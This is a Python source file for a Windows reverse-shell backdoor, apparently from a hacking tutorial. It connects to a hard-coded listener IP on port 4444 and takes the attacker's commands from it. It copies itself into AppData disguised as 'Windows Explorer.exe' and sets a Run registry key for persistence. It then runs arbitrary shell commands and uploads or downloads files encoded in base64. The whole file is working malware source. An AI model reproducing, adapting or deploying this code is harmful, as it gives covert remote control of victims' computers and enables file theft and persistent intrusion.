#!/usr/bin/env python
import socket
import subprocess
import json
import os
import base64
import sys
import shutil


class Backdoor:
	def __init__(self, ip, port):
		self.become_persistent()
		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.connection.connect((ip, port))

	# Creates windows registry entry to run backdoor when windows computer turns on
	def become_persistent(self):
		evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"	
		if not os.path.exists(evil_file_location):
			shutil.copyfile(sys.executable, evil_file_location)
			subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_location + '"', shell=True)

	# Function to send data
	def reliable_send(self, data):
		json_data = json.dumps(data)
		self.connection.send(json_data)

	# Function to receive data
	def reliable_receive(self):
		json_data = ""
		while True:
			try:
				json_data = json_data + self.connection.recv(1024)
				return json.loads(json_data)
			except ValueError:
				continue

	# Function to execute system system commands
	def execute_system_command(self, command):
		DEVNULL = open(os.devnull, 'wb')
		return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)

	# Function to change working directory
	def change_working_directory_to(self, path):
		os.chdir(path)
		return "[+] Changing working directory to " + path

	# Function to read files
	def read_file(self, path):
		with open(path, "rb") as file:
			return base64.b64encode(file.read())

	# Function to write files
	def write_file(self, path, content):
		with open(path, "wb") as file:
			file.write(base64.b64decode(content))
			return "[+] Upload successful."

	# Function that looks for key words to run specific function commands
	def run(self):
		while True:
			command = self.reliable_receive()

			try:
				if command[0] == "exit":
					self.connection.close()
					sys.exit()
				elif command[0] == "cd" and len(command) > 1:
					command_result = self.change_working_directory_to(command[1])
				elif command[0] == "download":
					command_result = self.read_file(command[1])
				elif command[0] == "upload":
					command_result = self.write_file(command[1], command[2])
				else:
					command_result = self.execute_system_command(command)
			except Exception:
				command_result = "[-] Error during command execution."
				
			self.reliable_send(command_result)

# Enter in listener computers IP Address and port
try:
	my_backdoor = Backdoor("192.168.1.105", 4444)
	my_backdoor.run()
except Exception:
	sys.exit()